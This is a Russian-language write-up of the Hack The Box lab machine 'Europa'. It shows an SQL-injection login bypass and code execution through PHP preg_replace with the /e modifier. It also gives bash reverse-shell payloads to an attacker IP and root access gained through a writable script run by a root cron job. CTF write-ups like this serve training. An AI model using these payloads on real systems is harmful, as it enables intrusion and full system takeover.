[Ссылка на машину](https://app.hackthebox.com/machines/Europa)

---
## Recon

```bash
sudo nmap -Pn -n --min-rate=1000 --open 10.129.5.173 -p- -oN discovery/full-tpc
```

![[Pasted image 20260529104252.png]]

 Сканирование инструментом `nmap` показало три открытых TCP порта: 22, 80 и 443. Попробуем вытащить информацию о сервисах

```bash
sudo nmap -Pn -n 10.129.5.173 -p 22,80,443 -sC -sV -oN discovery/tcp-services
```

![[Pasted image 20260529104440.png]]

Из данных SSL сертификата мы видим домен `europacorp.htb` и его субдомены `www.europacorp.htb` и `admin-portal.europacorp.htb`. 

Я решил подробнее рассмотреть сертификат и обнаружил в нем почту `admin@europacorp.htb`

![[Pasted image 20260529104630.png]]

Добавим домены в `/etc/hosts` 

```bash
echo "10.129.5.173 www.europacorp.htb admin-portal.europacorp.htb europacorp.htb" | sudo tee -a /etc/hosts
```

---
## Exploitation

### Website admin access

Переходим на `admin-portal.europacorp.htb` и видим форму входа, которая принимает email и пароль

![[Pasted image 20260529104824.png]]

Я попробовал использовать несколько часто встречаемых паролей в связке с найденной почтой `admin@europacorp.htb`, но это не привело к результату

Тестирование форм я начинаю с SQL-инъекций. Я передал символ `'` в поле email и сразу получил ошибку

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2cfd4560539f887a5e420412b370b361'' at line 1
```

![[Pasted image 20260529105352.png]]

Ошибка содержит часть SQL-выражения и указывает на некорректное экранирование пользовательского ввода, что подтверждает наличие уязвимости. Чаще всего подобные формы под капотом генерируют подобное выражение

```php
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
```

Попробуем обойти форму, завершив строковый литерал и закомментировав остаток SQL-запроса. В качестве почты используем найденную в SSL-сертификате.

```
admin@europacorp.htb'-- -
```

![[Pasted image 20260529105655.png]]

И получаем редирект на `/dashboard.php`

![[Pasted image 20260529110251.png]]

### `preg_replace()` to RCE

Рассмотрим страницу. Мы видим много нерабочих ссылок и вкладку Tools, где можно сгенерировать openvpn конфигурацию. В качестве ввода мы передаем IP-адрес и получаем в ответ готовый конфиг

![[Pasted image 20260529110354.png]]

Если пропустить запрос через Burp, мы увидим, что передается текст конфигурации, паттерн `\ip_address\` и поле IP-адреса, которое вставляется в конфигурацию

![[Pasted image 20260529110501.png]]

Сперва я подумал, что имею дело с template engine и потратил некоторое время на тестирование SSTI, что не дало никаких результатов. Поэтому я решил копать в сторону regexp выражений

Мы знаем, что язык backend'а - PHP. Небольшой поиск показал, что в PHP для реализации регулярных выражений есть функция `preg_replace()`, аргументы которой очень похожи на то, что мы передаем в запросе

```php
preg_replace('/cat/', 'dog', 'cat cat');
```

Более того, работу этой функции можно легко перевести в RCE, так как в совокупностью с модификатором `/e` в паттерне она заставляет интерпретировать replacement как PHP-код

```php
preg_replace('/test/e', 'php_code()', $text);
```

Попробуем изменить паттерн и отправить `system("id");` в поле `ipaddress`

```
pattern=/ip_address/e
ipaddress=system("id");
```

И получил в ответ вывод команды `id`, что подтверждает наличие уязвимости

![[Pasted image 20260529110849.png]]

Попробуем создать обратный шелл. Для этого я использовал следующую полезную нагрузку

```bash
bash -i >& /dev/tcp/10.10.14.123/9001 0>&1
```

И передал ее в качестве replacement-выражения для `preg_replace()` с модификатором `/e`.

```
pattern=/ip_address/e&ipaddress=system("bash -i >& /dev/tcp/10.10.14.123/9001 0>&1");
```

Запускаем nc-listener и получаем строку приглашения

```bash
nc -lvnp 9001
```

![[Pasted image 20260529102225.png]]

---
## Privilege Escalation

Для удобства я решил стабилизировать шелл до интерактивного

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

![[Pasted image 20260529102401.png]]

В файле `/var/www/admin/db.php` я нашел логин и пароль пользователя `john`. Вывод `cat /etc/passwd` показал, что такой же пользователь существует в системе Я попробовал использовать полученные данные, но они не подошли, поэтому я продолжил поиски. 

![[Pasted image 20260529102457.png]]

Я начал рассматривать webroot и нашел файл `/var/www/cronjobs/clearlogs`. Оказалось, что это php скрипт, который очищает файл access.log и запускает скрипт по пути `/var/www/cmd/logcleared.sh`

![[Pasted image 20260529103021.png]]

```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Я посмотрел в crontab и обнаружил задачу, которая запускает найденный скрипт от имени root-пользователя каждую минуту, что очень похоже на вектор повышения привилегий.

```
cat /etc/crontab
```

![[Pasted image 20260529111348.png]]

Я решил посмотреть файл `logcleared.sh`, но не обнаружил его. Но я заметил, что целевая папка доступна для записи пользователям группы `www-data`, к которой мы относимся. Это позволит записать свой скрипт, который выполнится от имени root пользователя после старта cron-задачи.

![[Pasted image 20260529103130.png]]

В качестве нагрузки я решил использовать еще один reverse shell.

```bash
#/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.123/9002 0>&1"
```


![[Pasted image 20260529103310.png]]

Сохраняем файл в `/var/www/cmd` и даем ему права на исполнение.

```bash
wget http://10.10.14.123:8000/logcleared.sh -C /var/www/cmd
chmod +x /var/www/cmd/logcleared.sh
```

![[Pasted image 20260529103547.png]]

Запускаем слушателя и ждем. Через несколько секунд получаем приглашение от root-пользователя

```bash
nc -lvnp 9002
```

![[Pasted image 20260529103810.png]]

---
#web #pentest